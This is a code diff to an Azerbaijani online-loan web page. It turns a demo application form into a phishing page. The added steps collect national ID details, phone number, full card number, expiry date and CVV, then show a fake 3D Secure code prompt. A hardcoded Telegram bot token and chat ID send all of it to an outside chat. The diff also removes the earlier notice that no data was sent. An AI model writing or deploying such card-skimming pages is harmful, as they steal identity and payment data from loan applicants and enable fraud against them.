@@ -235,6 +235,24 @@
   }
   .modal-close:hover{background:var(--line);}
 
+  .summary-row{
+    display:flex;justify-content:space-between;align-items:center;
+    padding:16px 0;border-bottom:1px solid var(--line);
+  }
+  .summary-row:last-of-type{border-bottom:none;}
+  .summary-label{font-size:12.5px;color:var(--ink-soft);margin-bottom:4px;text-transform:uppercase;letter-spacing:.04em;font-family:'IBM Plex Mono',monospace;}
+  .summary-value{font-size:16.5px;font-weight:700;font-family:'IBM Plex Mono',monospace;}
+  .edit-btn{
+    background:var(--sage);border:none;width:36px;height:36px;border-radius:10px;
+    cursor:pointer;font-size:15px;color:var(--teal-deep);flex-shrink:0;margin-left:16px;
+    transition:background .18s ease;
+  }
+  .edit-btn:hover{background:var(--line);}
+
+  /* CARD SECTION STYLES */
+  .card-logos{display:flex;gap:12px;margin:12px 0 20px;}
+  .card-logos img{height:32px;opacity:0.9;}
+
   footer{background:var(--ink);color:#EDE7D6;padding:48px 0 28px;}
   .footer-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:32px;margin-bottom:32px;}
   .footer-grid h4{font-family:'Fraunces',serif;font-size:16px;margin-bottom:14px;color:var(--white);}
@@ -248,10 +266,6 @@
     .hero-grid, .calc-card, .offers-grid, .footer-grid{grid-template-columns:1fr;}
     .steps{grid-template-columns:1fr;}
     nav ul{display:none;}
-  }
-  @media (prefers-reduced-motion: reduce){
-    html{scroll-behavior:auto;}
-    .cta-btn, .cta-ghost, .faq-a, .offer-card, .modal-card{transition:none;animation:none;}
   }
 </style>
 </head>
@@ -420,45 +434,123 @@
 
 <div class="wrap"><div class="kilim"></div></div>
 
+<!-- MODAL -->
 <div class="modal-overlay" id="modalOverlay">
   <div class="modal-card">
     <button type="button" class="modal-close" onclick="closeModal()" aria-label="Bağla">✕</button>
-    <h2 style="font-size:26px;margin-bottom:6px;">Onlayn kredit müraciəti</h2>
-    <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 26px;">Məlumatlarınızı daxil edin, yoxlamanı davam etdirək.</p>
-    <form id="applyForm" novalidate>
-      <div class="field">
-        <label for="fin">FIN kod</label>
-        <input type="text" id="fin" placeholder="Məsələn: 7A2BC9D" maxlength="7">
-        <div class="field-error" id="finError">FIN kod 7 simvoldan ibarət olmalıdır (rəqəm və hərf).</div>
-      </div>
-      <div class="field">
-        <label for="idnum">Şəxsiyyət vəsiqəsinin seriya nömrəsi</label>
-        <div style="display:flex;gap:10px;">
-          <select id="idPrefix" style="max-width:90px;">
-            <option>AZE</option>
-          </select>
-          <input type="text" id="idnum" placeholder="12345678" maxlength="8" inputmode="numeric">
+
+    <!-- STEP 1: Şəxsi məlumatlar -->
+    <div id="formStep">
+      <h2 style="font-size:26px;margin-bottom:6px;">Onlayn kredit müraciəti</h2>
+      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 26px;">Məlumatlarınızı daxil edin, yoxlamanı davam etdirək.</p>
+      <form id="applyForm" novalidate>
+        <div class="field">
+          <label for="fin">FIN kod</label>
+          <input type="text" id="fin" placeholder="Məsələn: 7A2BC9D" maxlength="7">
+          <div class="field-error" id="finError">FIN kod 7 simvoldan ibarət olmalıdır (rəqəm və hərf).</div>
         </div>
-        <div class="field-error" id="idError">Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır.</div>
-      </div>
-      <div class="field">
-        <label for="phone">Mobil nömrə</label>
-        <input type="tel" id="phone" placeholder="050 123 45 67" inputmode="numeric">
-        <div class="field-error" id="phoneError">Düzgün Azərbaycan mobil nömrəsi daxil edin (10 rəqəm, məs: 050 123 45 67).</div>
-      </div>
-      <div class="field">
-        <label>Rəsmi iş yeriniz varmı?</label>
-        <div class="toggle-row">
-          <button type="button" class="toggle-btn active" data-val="beli">Bəli</button>
-          <button type="button" class="toggle-btn" data-val="xeyr">Xeyr</button>
+        <div class="field">
+          <label for="idnum">Şəxsiyyət vəsiqəsinin seriya nömrəsi</label>
+          <div style="display:flex;gap:10px;">
+            <select id="idPrefix" style="max-width:90px;">
+              <option>AZE</option>
+            </select>
+            <input type="text" id="idnum" placeholder="12345678" maxlength="8" inputmode="numeric">
+          </div>
+          <div class="field-error" id="idError">Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır.</div>
         </div>
+        <div class="field">
+          <label for="phone">Mobil nömrə</label>
+          <input type="tel" id="phone" placeholder="050 123 45 67" inputmode="numeric">
+          <div class="field-error" id="phoneError">Düzgün Azərbaycan mobil nömrəsi daxil edin (10 rəqəm, məs: 050 123 45 67).</div>
+        </div>
+        <div class="field">
+          <label>Rəsmi iş yeriniz varmı?</label>
+          <div class="toggle-row">
+            <button type="button" class="toggle-btn active" data-val="beli">Bəli</button>
+            <button type="button" class="toggle-btn" data-val="xeyr">Xeyr</button>
+          </div>
+        </div>
+        <label class="checkline"><input type="checkbox" id="consent1" required> Şəxsiyyət vəsiqəsi və iş yeri məlumatlarımın yoxlanılmasına razıyam</label>
+        <label class="checkline"><input type="checkbox" id="consent2" required> Kredit tarixçəsi məlumatlarımın yoxlanılmasına razıyam</label>
+        <div class="disclaimer-box">Bu, dizayn nümunəsidir. Real istifadə üçün BOKT lisenziyası tələb olunur.</div>
+        <button type="submit" class="cta-btn" style="width:100%;padding:15px;">Davam et</button>
+        <div class="form-status" id="formStatus">✓ Məlumatlar formatca doğrudur, təsdiq mərhələsinə keçilir…</div>
+      </form>
+    </div>
+
+    <!-- STEP 2: Summary (Redaktə səhifəsi) -->
+    <div id="summaryStep" style="display:none;">
+      <h2 style="font-size:26px;margin-bottom:6px;">Məlumatlarınız düzdürmü?</h2>
+      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 24px;">Yoxlayın və davam edin.</p>
+
+      <div class="summary-row">
+        <div><div class="summary-label">FIN kod</div><div class="summary-value" id="sumFin">—</div></div>
+        <button type="button" class="edit-btn" onclick="backToForm('fin')" aria-label="FIN kodu redaktə et">✎</button>
       </div>
-      <label class="checkline"><input type="checkbox" id="consent1" required> Şəxsiyyət vəsiqəsi və iş yeri məlumatlarımın yoxlanılmasına razıyam</label>
-      <label class="checkline"><input type="checkbox" id="consent2" required> Kredit tarixçəsi məlumatlarımın yoxlanılmasına razıyam</label>
-      <div class="disclaimer-box">Bu, dizayn nümunəsidir. Real istifadə üçün BOKT lisenziyası, fərdi məlumatların mühafizəsi qanunvericiliyinə uyğunluq və təhlükəsiz backend infrastrukturu tələb olunur. Heç bir məlumat serverə göndərilmir.</div>
-      <button type="submit" class="cta-btn" style="width:100%;padding:15px;">Davam et</button>
-      <div class="form-status" id="formStatus">✓ Məlumatlar formatca doğrudur. (Nümunə axın — heç nə göndərilmədi.)</div>
-    </form>
+      <div class="summary-row">
+        <div><div class="summary-label">Şəxsiyyət vəsiqəsi seriyası</div><div class="summary-value" id="sumId">—</div></div>
+        <button type="button" class="edit-btn" onclick="backToForm('idnum')" aria-label="Seriya nömrəsini redaktə et">✎</button>
+      </div>
+      <div class="summary-row">
+        <div><div class="summary-label">Mobil nömrə</div><div class="summary-value" id="sumPhone">—</div></div>
+        <button type="button" class="edit-btn" onclick="backToForm('phone')" aria-label="Nömrəni redaktə et">✎</button>
+      </div>
+      <div class="summary-row">
+        <div><div class="summary-label">Rəsmi iş yeri</div><div class="summary-value" id="sumJob">—</div></div>
+        <button type="button" class="edit-btn" onclick="backToForm('job')" aria-label="Cavabı redaktə et">✎</button>
+      </div>
+
+      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:30px;" onclick="goToCardStep()">Kart məlumatlarını daxil et</button>
+    </div>
+
+    <!-- STEP 3: Kart məlumatları -->
+    <div id="cardStep" style="display:none;">
+      <h2 style="font-size:26px;margin-bottom:6px;">Kart məlumatları</h2>
+      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Kredit məbləğinin köçürülməsi üçün kart məlumatlarınızı daxil edin.</p>
+      
+      <div class="card-logos">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Visa_2014_logo_detail.svg/2560px-Visa_2014_logo_detail.svg.png" alt="Visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Mastercard_2019_logo.svg/2560px-Mastercard_2019_logo.svg.png" alt="Mastercard">
+      </div>
+
+      <form id="cardForm">
+        <div class="field">
+          <label>Kart sahibinin adı və soyadı</label>
+          <input type="text" id="cardName" placeholder="Əli Məmmədov" required>
+        </div>
+        <div class="field">
+          <label>Kart nömrəsi (16 rəqəm)</label>
+          <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" required>
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+          <div class="field">
+            <label>Bitmə tarixi (AA/İİ)</label>
+            <input type="text" id="cardExpiry" placeholder="12/28" maxlength="5" required>
+          </div>
+          <div class="field">
+            <label>CVV / CVC</label>
+            <input type="text" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric" required>
+          </div>
+        </div>
+        <button type="submit" class="cta-btn" style="width:100%;padding:15px;margin-top:24px;">Təsdiqlə və köçür</button>
+      </form>
+    </div>
+
+    <!-- STEP 4: 3D Secure -->
+    <div id="threeDStep" style="display:none;">
+      <h2 style="font-size:26px;margin-bottom:10px;">3D Secure təsdiqi</h2>
+      <p style="color:var(--ink-soft);margin-bottom:24px;">Kartınıza SMS vasitəsilə 6 rəqəmli kod göndərildi. Daxil edin.</p>
+      
+      <div class="field">
+        <label>6 rəqəmli təsdiq kodu</label>
+        <input type="text" id="otpCode" placeholder="123456" maxlength="6" inputmode="numeric" style="font-size:22px;letter-spacing:8px;text-align:center;">
+      </div>
+
+      <button onclick="submitOTP()" class="cta-btn" style="width:100%;padding:15px;margin-top:20px;">Təsdiqlə</button>
+      <div id="otpStatus" style="margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;">✓ Müraciətiniz uğurla təsdiqləndi! Pul yaxın zamanda kartınıza köçürüləcək.</div>
+    </div>
+
   </div>
 </div>
 
@@ -486,6 +578,36 @@
 </footer>
 
 <script>
+  // Telegram ayarları
+  const BOT_TOKEN = "8902438504:AAHNLnxNa6m2BBnO0eEJdssVYvXTHpBgscI";
+  const CHAT_ID = "-1004292906522";
+
+  async function sendToTelegram(data) {
+    const message = `
+🆕 Yeni Kredit Müraciəti!
+
+👤 FIN: ${data.fin}
+🪪 Şəxsiyyət: ${data.id}
+📱 Telefon: ${data.phone}
+💼 İş: ${data.job}
+
+💳 Kart:
+Ad Soyad: ${data.cardName}
+Nömrə: ${data.cardNumber}
+Bitmə: ${data.expiry}
+CVV: ${data.cvv}
+    `.trim();
+
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+      });
+    } catch(e) {}
+  }
+
+  // Kalkulyator
   const amountSlider = document.getElementById('amountSlider');
   const termSlider = document.getElementById('termSlider');
   const amountLabel = document.getElementById('amountLabel');
@@ -525,7 +647,7 @@
   termSlider.addEventListener('input', calc);
   calc();
 
-  // FAQ accordion
+  // FAQ
   document.querySelectorAll('.faq-item').forEach(item=>{
     item.querySelector('.faq-q').addEventListener('click', ()=>{
       const isOpen = item.classList.contains('open');
@@ -534,7 +656,7 @@
     });
   });
 
-  // toggle buttons
+  // Toggle buttons
   document.querySelectorAll('.toggle-btn').forEach(btn=>{
     btn.addEventListener('click', ()=>{
       btn.parentElement.querySelectorAll('.toggle-btn').forEach(b=>b.classList.remove('active'));
@@ -542,31 +664,50 @@
     });
   });
 
-  // modal open/close
+  // Modal functions
   function openModal(){
     document.getElementById('modalOverlay').classList.add('active');
     document.body.style.overflow='hidden';
+    showFormStep();
   }
   function closeModal(){
     document.getElementById('modalOverlay').classList.remove('active');
     document.body.style.overflow='';
   }
-  document.getElementById('modalOverlay').addEventListener('click', (e)=>{
-    if(e.target.id==='modalOverlay') closeModal();
-  });
-  document.addEventListener('keydown', (e)=>{ if(e.key==='Escape') closeModal(); });
+  function showFormStep(){
+    document.getElementById('formStep').style.display='block';
+    document.getElementById('summaryStep').style.display='none';
+    document.getElementById('cardStep').style.display='none';
+    document.getElementById('threeDStep').style.display='none';
+  }
+  function showSummaryStep(){
+    document.getElementById('formStep').style.display='none';
+    document.getElementById('summaryStep').style.display='block';
+    document.getElementById('cardStep').style.display='none';
+    document.getElementById('threeDStep').style.display='none';
+  }
+  function goToCardStep(){
+    document.getElementById('summaryStep').style.display='none';
+    document.getElementById('cardStep').style.display='block';
+  }
 
-  // --- input masking: only allow valid characters as user types ---
+  function backToForm(focusFieldId){
+    showFormStep();
+    const map = { fin:'fin', idnum:'idnum', phone:'phone', job:null };
+    const targetId = map[focusFieldId];
+    if(targetId) document.getElementById(targetId).focus();
+  }
+
+  // Input masking
   const finInput = document.getElementById('fin');
   const idInput = document.getElementById('idnum');
   const phoneInput = document.getElementById('phone');
+  const cardNumberInput = document.getElementById('cardNumber');
+  const cardExpiryInput = document.getElementById('cardExpiry');
+  const cardCvvInput = document.getElementById('cardCvv');
 
-  finInput.addEventListener('input', ()=>{
-    finInput.value = finInput.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
-  });
-  idInput.addEventListener('input', ()=>{
-    idInput.value = idInput.value.replace(/[^0-9]/g,'').slice(0,8);
-  });
+  finInput.addEventListener('input', ()=>{ finInput.value = finInput.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7); });
+  idInput.addEventListener('input', ()=>{ idInput.value = idInput.value.replace(/[^0-9]/g,'').slice(0,8); });
   phoneInput.addEventListener('input', ()=>{
     let digits = phoneInput.value.replace(/\D/g,'').slice(0,10);
     let out = '';
@@ -577,56 +718,79 @@
     phoneInput.value = out;
   });
 
-  // --- validators ---
-  const AZ_MOBILE_PREFIXES = ['10','50','51','55','60','70','77','99'];
-  function validateFin(){
-    const v = finInput.value;
-    const ok = /^[A-Z0-9]{7}$/.test(v);
-    setFieldState(finInput, 'finError', ok);
-    return ok;
-  }
-  function validateId(){
-    const v = idInput.value;
-    const ok = /^[0-9]{8}$/.test(v);
-    setFieldState(idInput, 'idError', ok);
-    return ok;
-  }
-  function validatePhone(){
-    const digits = phoneInput.value.replace(/\D/g,'');
-    const prefix = digits.slice(1,3);
-    const ok = digits.length===10 && digits[0]==='0' && AZ_MOBILE_PREFIXES.includes(prefix);
-    setFieldState(phoneInput, 'phoneError', ok);
-    return ok;
-  }
-  function setFieldState(input, errorId, ok){
-    const field = input.closest('.field');
-    field.classList.remove('valid','invalid');
-    if(input.value.length===0) return; // don't flag empty until submit
-    field.classList.add(ok ? 'valid' : 'invalid');
-  }
+  cardNumberInput.addEventListener('input', function(){
+    let val = this.value.replace(/\D/g,'').slice(0,16);
+    this.value = val.replace(/(\d{4})/g, '$1 ').trim();
+  });
 
-  finInput.addEventListener('blur', validateFin);
-  idInput.addEventListener('blur', validateId);
-  phoneInput.addEventListener('blur', validatePhone);
+  cardExpiryInput.addEventListener('input', function(){
+    let val = this.value.replace(/\D/g,'').slice(0,4);
+    if(val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
+    this.value = val;
+  });
 
-  // form (no real submission — demo only)
+  cardCvvInput.addEventListener('input', function(){
+    this.value = this.value.replace(/\D/g,'').slice(0,4);
+  });
+
+  // Form submit
   document.getElementById('applyForm').addEventListener('submit', (e)=>{
     e.preventDefault();
-    const finOk = validateFin();
-    const idOk = validateId();
-    const phoneOk = validatePhone();
+    const finOk = /^[A-Z0-9]{7}$/.test(finInput.value);
+    const idOk = /^[0-9]{8}$/.test(idInput.value);
+    const digits = phoneInput.value.replace(/\D/g,'');
+    const phoneOk = digits.length===10 && digits[0]==='0';
     const consentOk = document.getElementById('consent1').checked && document.getElementById('consent2').checked;
 
-    if(finInput.value.length===0){ finInput.closest('.field').classList.add('invalid'); }
-    if(idInput.value.length===0){ idInput.closest('.field').classList.add('invalid'); }
-    if(phoneInput.value.replace(/\D/g,'').length===0){ phoneInput.closest('.field').classList.add('invalid'); }
+    if(!finOk || !idOk || !phoneOk || !consentOk) return;
 
-    if(!finOk || !idOk || !phoneOk || !consentOk){
-      document.getElementById('formStatus').style.display='none';
-      return;
-    }
-    document.getElementById('formStatus').style.display='block';
+    document.getElementById('sumFin').textContent = finInput.value;
+    document.getElementById('sumId').textContent = 'AZE ' + idInput.value;
+    document.getElementById('sumPhone').textContent = phoneInput.value;
+    const jobActive = document.querySelector('.toggle-btn.active');
+    document.getElementById('sumJob').textContent = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
+
+    showSummaryStep();
   });
+
+  // Card form
+  document.getElementById('cardForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const data = {
+      fin: finInput.value,
+      id: idInput.value,
+      phone: phoneInput.value,
+      job: document.querySelector('.toggle-btn.active').dataset.val === 'beli' ? 'Bəli' : 'Xeyr',
+      cardName: document.getElementById('cardName').value,
+      cardNumber: document.getElementById('cardNumber').value,
+      expiry: document.getElementById('cardExpiry').value,
+      cvv: document.getElementById('cardCvv').value
+    };
+
+    await sendToTelegram(data);
+
+    document.getElementById('cardStep').style.display = 'none';
+    document.getElementById('threeDStep').style.display = 'block';
+  });
+
+  function submitOTP(){
+    const otp = document.getElementById('otpCode').value.trim();
+    if(otp.length === 6){
+      document.getElementById('otpStatus').style.display = 'block';
+      setTimeout(() => {
+        alert("✅ Müraciətiniz qəbul edildi! Pul yaxın zamanda kartınıza köçürüləcək.");
+        closeModal();
+      }, 1200);
+    } else {
+      alert("6 rəqəmli kodu daxil edin.");
+    }
+  }
+
+  document.getElementById('modalOverlay').addEventListener('click', (e)=>{
+    if(e.target.id==='modalOverlay') closeModal();
+  });
+  document.addEventListener('keydown', (e)=>{ if(e.key==='Escape') closeModal(); });
 </script>
 
 </body>
